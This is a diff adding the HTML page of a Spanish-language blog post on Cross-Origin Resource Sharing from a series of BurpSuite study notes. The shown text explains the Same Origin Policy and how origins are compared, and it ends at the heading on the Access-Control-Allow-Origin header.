@@ -1,0 +1,1536 @@
+<!DOCTYPE html>
+<html lang="en">
+<!-- Beautiful Jekyll 5.0.0 | Copyright Dean Attali 2020 -->
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  
+
+  
+
+  <title>13. Cross-Origin Resource Sharing.</title>
+
+  
+  <meta name="author" content="Qv1nTv5">
+  
+
+  <meta name="description" content="Detección y explotación de vulnerabilidades CORS a través de la herramienta BurpSuite.">
+
+  
+
+  
+
+  
+  <link rel="alternate" type="application/rss+xml" title="Home" href="http://localhost:4000/feed.xml">
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+    
+      
+  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+
+
+    
+      
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.min.css">
+
+
+    
+      
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic">
+
+
+    
+      
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800">
+
+
+    
+  
+
+  
+    
+      <link rel="stylesheet" href="/assets/css/bootstrap-social.css">
+    
+      <link rel="stylesheet" href="/assets/css/beautifuljekyll.css">
+    
+  
+
+  
+
+  
+  
+  
+
+  
+
+  
+  <meta property="og:site_name" content="Home">
+  <meta property="og:title" content="13. Cross-Origin Resource Sharing.">
+  <meta property="og:description" content="Detección y explotación de vulnerabilidades CORS a través de la herramienta BurpSuite.">
+
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:article:author" content="Qv1nTv5">
+  <meta property="og:article:published_time" content="2022-03-18T00:00:00-04:00">
+  <meta property="og:url" content="http://localhost:4000/2022-03-18-13.Cross-origin_resource_sharing_(CORS)/">
+  <link rel="canonical" href="http://localhost:4000/2022-03-18-13.Cross-origin_resource_sharing_(CORS)/">
+  
+
+  
+  <meta name="twitter:card" content="summary">
+  
+  <meta name="twitter:site" content="@Qvintvs1">
+  <meta name="twitter:creator" content="@Qvintvs1">
+
+  <meta property="twitter:title" content="13. Cross-Origin Resource Sharing.">
+  <meta property="twitter:description" content="Detección y explotación de vulnerabilidades CORS a través de la herramienta BurpSuite.">
+
+  
+
+  
+
+
+  
+
+  
+
+</head>
+
+
+<body>
+
+  
+
+
+  <nav class="navbar navbar-expand-xl navbar-light fixed-top navbar-custom top-nav-regular"><a class="navbar-brand" href="http://localhost:4000/">Home</a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false" aria-label="Toggle navigation">
+    <span class="navbar-toggler-icon"></span>
+  </button>
+
+  <div class="collapse navbar-collapse" id="main-navbar">
+    <ul class="navbar-nav ml-auto">
+          <li class="nav-item dropdown">
+            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Program</a>
+            <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                  <a class="dropdown-item" href="/Cpage">C</a>
+                  <a class="dropdown-item" href="/DHARMApage">Dharma</a>
+            </div>
+          </li>
+        
+          <li class="nav-item dropdown">
+            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Pentest</a>
+            <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                  <a class="dropdown-item" href="/BURPSUITEpage">Burp</a>
+                  <a class="dropdown-item" href="/THMpage">Thm</a>
+                  <a class="dropdown-item" href="/HackTheBoxpage">Htb</a>
+                  <a class="dropdown-item" href="/PEN200page">BasicPentesting</a>
+                  <a class="dropdown-item" href="/REDTEAMBASICSpage">RedTeam</a>
+                  <a class="dropdown-item" href="/BLUETEAMBASICSpage">Blueteam</a>
+                  <a class="dropdown-item" href="/REDESpage">Net</a>
+                  <a class="dropdown-item" href="/2022-11-17-GitBasics">Git</a>
+            </div>
+          </li>
+        
+        <li class="nav-item">
+          <a class="nav-link" id="nav-search-link" href="#" title="Search">
+            <span id="nav-search-icon" class="fa fa-search"></span>
+            <span id="nav-search-text">Search</span>
+          </a>
+        </li></ul>
+  </div>
+
+  
+
+  
+
+</nav>
+
+
+
+<div id="beautifuljekyll-search-overlay">
+
+  <div id="nav-search-exit" title="Exit search">✕</div>
+  <input type="text" id="nav-search-input" placeholder="Search">
+  <ul id="search-results-container"></ul>
+  
+  <script src="https://unpkg.com/simple-jekyll-search@latest/dest/simple-jekyll-search.min.js"></script>
+  <script>
+    var searchjson = '[ \
+       \
+        { \
+          "title"    : "2. Constants and Literals in C.", \
+          "category" : "C", \
+          "url"      : "/2024-12-10-1.ConstantsinC-copy/", \
+          "date"     : "December 10, 2024" \
+        }, \
+       \
+        { \
+          "title"    : "1. Basics of C", \
+          "category" : "C", \
+          "url"      : "/2024-12-02-1.BasicsOfC/", \
+          "date"     : "December  2, 2024" \
+        }, \
+       \
+        { \
+          "title"    : "Gramáticas en Dharma", \
+          "category" : "DHA", \
+          "url"      : "/2024-09-24-Dharma_Tutorial/", \
+          "date"     : "September 24, 2024" \
+        }, \
+       \
+        { \
+          "title"    : "Gramáticas en Dharma", \
+          "category" : "fuzz", \
+          "url"      : "/2024-03-22-Dharma_Tutorial-copy/", \
+          "date"     : "March 22, 2024" \
+        }, \
+       \
+        { \
+          "title"    : "Mi experiencia con el OSCP", \
+          "category" : "pen", \
+          "url"      : "/2023-11-19-PEN200_Experience/", \
+          "date"     : "November 19, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Client Side", \
+          "category" : "pen", \
+          "url"      : "/2023-11-17-17.Client_Side_Attacks/", \
+          "date"     : "November 17, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Deep Packet Tunneling", \
+          "category" : "pen", \
+          "url"      : "/2023-11-16-16.Tunneling_Through_Deep_Packet_Inspection/", \
+          "date"     : "November 16, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Report", \
+          "category" : "pen", \
+          "url"      : "/2023-11-15-15.Making_Reports/", \
+          "date"     : "November 15, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Metasploit", \
+          "category" : "pen", \
+          "url"      : "/2023-11-14-14.Metasploit/", \
+          "date"     : "November 14, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Password Attacks", \
+          "category" : "pen", \
+          "url"      : "/2023-11-13-13.Password_Attacks/", \
+          "date"     : "November 13, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Active Directory Attacks", \
+          "category" : "pen", \
+          "url"      : "/2023-11-12-12.Active_Directory_Attacks/", \
+          "date"     : "November 12, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Port Forwarding", \
+          "category" : "pen", \
+          "url"      : "/2023-11-11-11.Port_Forwarding/", \
+          "date"     : "November 11, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Privilege Escalation", \
+          "category" : "pen", \
+          "url"      : "/2023-11-10-10.Privilege_Escalation/", \
+          "date"     : "November 10, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "File Transfers", \
+          "category" : "pen", \
+          "url"      : "/2023-11-09-9.File_Tranfers/", \
+          "date"     : "November  9, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Buffer Overflows", \
+          "category" : "pen", \
+          "url"      : "/2023-11-08-8.Buffer_Overflows/", \
+          "date"     : "November  8, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Vulnerability Scanning.", \
+          "category" : "pen", \
+          "url"      : "/2023-11-07-7.Vulnerability_Scanning/", \
+          "date"     : "November  7, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Information Gathering", \
+          "category" : "pen", \
+          "url"      : "/2023-11-06-6.Active_Information_Gathering/", \
+          "date"     : "November  6, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Windows", \
+          "category" : "pen", \
+          "url"      : "/2023-11-05-5.Windows/", \
+          "date"     : "November  5, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Networking", \
+          "category" : "pen", \
+          "url"      : "/2023-11-04-4.Networking/", \
+          "date"     : "November  4, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Scripting", \
+          "category" : "pen", \
+          "url"      : "/2023-11-03-3.Scripting/", \
+          "date"     : "November  3, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Practical Tools", \
+          "category" : "pen", \
+          "url"      : "/2023-11-02-2.PracticalTools/", \
+          "date"     : "November  2, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Linux", \
+          "category" : "pen", \
+          "url"      : "/2023-11-01-1.Linux/", \
+          "date"     : "November  1, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Easy", \
+          "category" : "hack", \
+          "url"      : "/2022-12-01-Easy/", \
+          "date"     : "December  1, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Git Basics", \
+          "category" : "", \
+          "url"      : "/2022-11-17-GitBasics/", \
+          "date"     : "November 17, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Tier I", \
+          "category" : "hack", \
+          "url"      : "/2022-11-10-Tier_1/", \
+          "date"     : "November 10, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Tier 0", \
+          "category" : "hack", \
+          "url"      : "/2022-11-09-Tier_0/", \
+          "date"     : "November  9, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "7.BufferOverflow.", \
+          "category" : "thm", \
+          "url"      : "/2022-11-02-7.BufferOverflow/", \
+          "date"     : "November  2, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "6.Offensive Pentesting", \
+          "category" : "thm", \
+          "url"      : "/2022-11-01-6.OffensivePentesting/", \
+          "date"     : "November  1, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "5.RedTeam", \
+          "category" : "thm", \
+          "url"      : "/2022-10-30-5.RedTeam/", \
+          "date"     : "October 30, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "4.Windows", \
+          "category" : "thm", \
+          "url"      : "/2022-10-22-4.Windows/", \
+          "date"     : "October 22, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "3.Junior Penetrationtester path", \
+          "category" : "thm", \
+          "url"      : "/2022-09-02-3.JRPenetrationTester/", \
+          "date"     : "September  2, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "2.Complete Begginer path.", \
+          "category" : "thm", \
+          "url"      : "/2022-08-07-2.CompleteBegginer/", \
+          "date"     : "August  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "1.Pre-Security path.", \
+          "category" : "thm", \
+          "url"      : "/2022-07-11-1Pre-Security/", \
+          "date"     : "July 11, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "0.Scripting for pentesters.", \
+          "category" : "thm", \
+          "url"      : "/2022-07-10-0.Scripting_for_pentesters/", \
+          "date"     : "July 10, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Burp Certified Practitioner Practice Exam.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-30-PracticeExam/", \
+          "date"     : "March 30, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "22. OAuth Authentication.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-27-22.OAuth_authentication/", \
+          "date"     : "March 27, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "21. HTTP Request Smuggling.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-26-21.HTTP_request_smuggling/", \
+          "date"     : "March 26, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "20. HTTP Host Header Attacks.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-25-20.HTTP_Host_header_attacks/", \
+          "date"     : "March 25, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "19. Web Cache Poisoning.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-24-19.Web_cache_poisoning/", \
+          "date"     : "March 24, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "18. Server-Side Template Injection.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-23-18.Serve-side_template_injection/", \
+          "date"     : "March 23, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "17. Insecure Deserialization.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-22-17.Insecure_deserialization/", \
+          "date"     : "March 22, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "16. WebSockets.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-21-16.WebSockets/", \
+          "date"     : "March 21, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "15.DOM-based XSS vulnerabilities.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-20-15-DOM-based_vulnerabilities/", \
+          "date"     : "March 20, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "14. Clickjacking.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-19-14.Clickjacking/", \
+          "date"     : "March 19, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "13. Cross-Origin Resource Sharing.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-18-13.Cross-origin_resource_sharing_(CORS)/", \
+          "date"     : "March 18, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "12. Cross-Site Request Forgery.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-17-12.Cross-site_request_forgery_(CSRF)/", \
+          "date"     : "March 17, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "11. Cross-Site Scripting.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-16-11.Cross-site_scripting_(XSS)/", \
+          "date"     : "March 16, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "10. XXE Injection.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-15-10.XXE_injection/", \
+          "date"     : "March 15, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "9. Server-Side Request Forgery.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-14-9.Server-side_request_forgery/", \
+          "date"     : "March 14, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "8. File Upload.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-13-8.File_upload_vulnerabilities/", \
+          "date"     : "March 13, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "7. Access Control.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-12-7.Access_control/", \
+          "date"     : "March 12, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "6. Information Disclosure.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-11-6.Information_disclosure/", \
+          "date"     : "March 11, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "5. Bussiness Logic Vulnerabilities.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-10-5.Business_logic_vulnerabilities/", \
+          "date"     : "March 10, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "4. Command Injection.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-09-4.Command_Injection/", \
+          "date"     : "March  9, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "3. Directory Traversal.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-08-3.Directory_Traversal/", \
+          "date"     : "March  8, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "2. Authentication.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-07-2.Authentication/", \
+          "date"     : "March  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "1. SQLInjection", \
+          "category" : "burp", \
+          "url"      : "/2022-03-06-1.SQLInjection/", \
+          "date"     : "March  6, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Seguridad Perimetral", \
+          "category" : "blueteam", \
+          "url"      : "/2022-02-09-Seguridad_Perimetral/", \
+          "date"     : "February  9, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Hardening de sistemas", \
+          "category" : "blueteam", \
+          "url"      : "/2022-02-09-Hardening_de_sistemas/", \
+          "date"     : "February  9, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Bandit", \
+          "category" : "otw", \
+          "url"      : "/2022-02-08-Bandit/", \
+          "date"     : "February  8, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Proxy", \
+          "category" : "redes", \
+          "url"      : "/2022-02-07-Proxys/", \
+          "date"     : "February  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Protocolos Relevantes", \
+          "category" : "redes", \
+          "url"      : "/2022-02-07-Protocolos_Importantes/", \
+          "date"     : "February  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Curso Básico Redes", \
+          "category" : "redes", \
+          "url"      : "/2022-02-07-Precurso_Redes/", \
+          "date"     : "February  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "IPs", \
+          "category" : "redes", \
+          "url"      : "/2022-02-07-IPs/", \
+          "date"     : "February  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Movimientos Laterales", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-06-Introducci%C3%B3n_a_movimientos_laterales/", \
+          "date"     : "February  6, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Evasión de Defensas", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-05-Evasi%C3%B3n_de_Defensas/", \
+          "date"     : "February  5, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Escalada de privilegios", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-05-Escalada_de_privilegios/", \
+          "date"     : "February  5, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Metasploit", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-04-Metasploit_B%C3%A1sico/", \
+          "date"     : "February  4, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Ataques a aplicaciones Android", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-03-Ataques_aplicaciones_android/", \
+          "date"     : "February  3, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Ataque a aplicaciones web.", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-02-Ataques_a_aplicaciones_web/", \
+          "date"     : "February  2, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Ataques a Infraestructuras y Redes", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-01-Ataques_a_Infraestructuras_y_Redes/", \
+          "date"     : "February  1, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Análisis de Objetivos", \
+          "category" : "redteam", \
+          "url"      : "/2022-01-28-An%C3%A1lisis_de_Objetivos/", \
+          "date"     : "January 28, 2022" \
+        }, \
+       \
+       \
+        { \
+          "title"    : "Blueteam Basics", \
+          "category" : "page", \
+          "url"      : "/BLUETEAMBASICSpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "PortSwigger BurpSuite Course", \
+          "category" : "page", \
+          "url"      : "/BURPSUITEpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "C programming subjects.", \
+          "category" : "page", \
+          "url"      : "/Cpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Dharma Fuzzer language", \
+          "category" : "page", \
+          "url"      : "/DHARMApage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Exploiting &amp; Reversing", \
+          "category" : "page", \
+          "url"      : "/EXPREVpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Fuzzing JavaScript Engine", \
+          "category" : "page", \
+          "url"      : "/Fuzzpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "HackTheBox", \
+          "category" : "page", \
+          "url"      : "/HackTheBoxpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "PEN200 notes", \
+          "category" : "page", \
+          "url"      : "/PEN200page/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Proyectos", \
+          "category" : "page", \
+          "url"      : "/PROJECTSpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Networking Basics", \
+          "category" : "page", \
+          "url"      : "/REDESpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "RedTeam Basics", \
+          "category" : "page", \
+          "url"      : "/REDTEAMBASICSpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Retired Machines", \
+          "category" : "page", \
+          "url"      : "/RetiredMachinespage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "TryHackMe", \
+          "category" : "page", \
+          "url"      : "/THMpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "About me", \
+          "category" : "page", \
+          "url"      : "/aboutme/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "THM", \
+          "category" : "page", \
+          "url"      : "/preOSCPpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Tag Index", \
+          "category" : "page", \
+          "url"      : "/tags/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page2/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page3/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page4/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page5/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page6/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page7/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page8/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page9/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page10/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page11/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page12/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page13/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page14/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page15/", \
+          "date"     : "January 1, 1970" \
+        } \
+       \
+    ]';
+    searchjson = JSON.parse(searchjson);
+
+    var sjs = SimpleJekyllSearch({
+      searchInput: document.getElementById('nav-search-input'),
+      resultsContainer: document.getElementById('search-results-container'),
+      json: searchjson
+    });
+  </script>
+</div>
+
+
+
+
+
+  <!-- TODO this file has become a mess, refactor it -->
+
+
+
+
+
+
+
+<header class="header-section ">
+
+<div class="intro-header no-img">
+  <div class="container-md">
+    <div class="row">
+      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
+        <div class="post-heading">
+          <h1>13. Cross-Origin Resource Sharing.</h1>
+          
+            
+              <h2 class="post-subheading">Detección y explotación de vulnerabilidades CORS a través de la herramienta BurpSuite.</h2>
+            
+          
+
+          
+            <span class="post-meta">Posted on March 18, 2022</span>
+            
+            
+          
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+</header>
+
+
+
+
+
+<div class=" container-md ">
+  <div class="row">
+    <div class=" col-xl-8 offset-xl-2 col-lg-10 offset-lg-1 ">
+
+      
+
+      
+
+      <article role="main" class="blog-post">
+        <h2 id="0-índice">0. Índice.</h2>
+<ul>
+  <li>1 Presentación del concepto.
+    <ul>
+      <li>1.1. Introducción.</li>
+      <li>1.2.Antecedentes: Same Origin Policy.
+        <ul>
+          <li>1.2.1. Introducción al SOP.</li>
+          <li>1.2.2. Implementación del mecanismo.</li>
+          <li>1.2.3. Relajación de la SOP. Cabecera Access-Control-Allow-Origin.</li>
+          <li>1.2.4. Implementación del intercambio simple de recursos de origen cruzado.</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>2 Vulnerabilidades planteadas desde la configuración CORS.</li>
+</ul>
+
+<p><br /></p>
+
+<h3 id="1-presentación-del-concepto">1. Presentación del concepto.</h3>
+
+<h4 id="11-introducción">1.1. Introducción.</h4>
+
+<p>Cross-Origin Resource Sharing, por sus siglas CORS y en español: Intercambio de Recursos de Origen Cruzado. Se trata de un mecanismo del navegador por el cual le permite controlar el acceso a los recursos localizados fuera de un dominio dado. Extiende y agrega flexibilidad al Same Origin Policy.</p>
+
+<p>Sin embargo, también brinda la posibilidad de ataques entre dominios, si la política CORS de un sitio web está mal configurada e implementada.</p>
+
+<p><br /></p>
+
+<h4 id="12antecedentes-same-origin-policy">1.2.Antecedentes: Same Origin Policy.</h4>
+
+<h5 id="121-introducción-al-sop">1.2.1. Introducción al SOP.</h5>
+
+<p>La SOP es un mecanismo de seguridad de un buscador web que pretende prevenir ataques de origen cruzado. El origen es un término que se utiliza para designar a tres componentes de una request. El esquema, la dirección y el puerto, aunque esto puede variar en función del navegador que se utilice.</p>
+
+<p>Se trata de una regla aplicada por los navegadores web, que controla el acceso a los datos entre sitios web y aplicaciones web. Sin SOP, cualquier página web podría acceder al DOM de otras páginas. Esto le permitiría acceder a datos potencialmente confidenciales de otra página web (tal y como sucede con las vulnerabilidades XSS), así como realizar acciones en otras páginas web sin el consentimiento del usuario.</p>
+
+<p>Por otra parte, en términos web, el origen es un conjunto de características comunes de un recurso web. En la mayoría de los casos, el origen es una combinación de tres elementos:</p>
+
+<ul>
+  <li>el esquema (protocolo; http, ftp, etc)</li>
+  <li>el nombre de host (dominio/subdominio; google.com, youtube.com, etc)</li>
+  <li>el puerto (80, 8080, 443, etc).</li>
+</ul>
+
+<pre><code class="language-default">scheme://domain-subdomain:port/path
+</code></pre>
+
+<p>(Excepto en Internet Explorer en el que el puerto no forma parte del origen)</p>
+
+<p>De esta forma, todos los recursos identificados por <em>schema:hostname/anything:port</em> tienen el mismo origen y el SOP aplica que los recursos asociados a un origen sólo pueden ser accedidos desde dicho origen.</p>
+
+<p>Así, consideremos una URL genérica, que utilice el esquema http, el dominio website.com y el puerto 80:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://website.com:80/path
+</code></pre></div></div>
+
+<p>modifiquemos esta URL de diferentes formas para entender el comportamiento del mecanismo SOP:</p>
+
+<p><br /></p>
+
+<table>
+  <thead>
+    <tr>
+      <th>URL</th>
+      <th>Resultado</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>http:\//en.website.com/path/</td>
+      <td>No; diferente dominio</td>
+    </tr>
+    <tr>
+      <td>http:\//website.com/path2/</td>
+      <td>Si; mismo esquema, dominio y puerto</td>
+    </tr>
+    <tr>
+      <td>https:\//website.com/path/</td>
+      <td>No; diferente esquema y puerto</td>
+    </tr>
+    <tr>
+      <td>http:\//en.website.com\/path/</td>
+      <td>No; diferente dominio</td>
+    </tr>
+    <tr>
+      <td>http:\//www.website.com/path/</td>
+      <td>No; diferente dominio</td>
+    </tr>
+    <tr>
+      <td>http:\//en.website.com:8080/path/</td>
+      <td>No; diferente puerto</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><br /></p>
+
+<p>De esta forma; todos los recursos de un sitio web (funcionalidades, páginas, etc) están asociadas a un origen. Cuando una página web intenta acceder al recurso de otro sitio web (como una página o una imagen) genera un elemento (un documento, un enlace, etc) que contiene el origen de la página que solicite el servicio en cuestión.</p>
+
+<p>Así, el SOP es un mecanismo por el cual un recurso asociado a un origen sólo es accesible desde el mismo origen salvo excepciones.</p>
+
+<p><br /></p>
+
+<h5 id="122-implementación-del-mecanismo">1.2.2. Implementación del mecanismo.</h5>
+
+<p>La política del mismo origen generalmente controla el acceso que tiene el código JavaScript al contenido que se carga entre dominios.</p>
+
+<p>Por lo general, se permite la carga de origen cruzado de los recursos de la página. Por ejemplo, el SOP permite incrustar imágenes a través de la etiqueta &lt;img&gt;, medios a través de la etiqueta &lt;video&gt; e incluye JavaScript con la etiqueta &lt;script&gt;.</p>
+
+<p>Sin embargo, aunque la página puede cargar estos recursos externos, cualquier código JavaScript en la página no podrá leer el contenido de estos recursos excepto algunas excepciones.</p>
+
+<p>Debido a los requisitos heredados, la SOP es más relajada cuando se trata de cookies, por lo que a menudo se puede acceder a ellas desde todos los subdominios de un sitio, aunque técnicamente cada subdominio tenga un origen diferente. Puede mitigar parcialmente este riesgo utilizando el indicador de cookies HttpOnly.</p>
+
+<p><br /></p>
+
+<h5 id="123-relajación-de-la-sop-cabecera-access-control-allow-origin">1.2.3. Relajación de la SOP. Cabecera Access-Control-Allow-Origin.</h5>
+
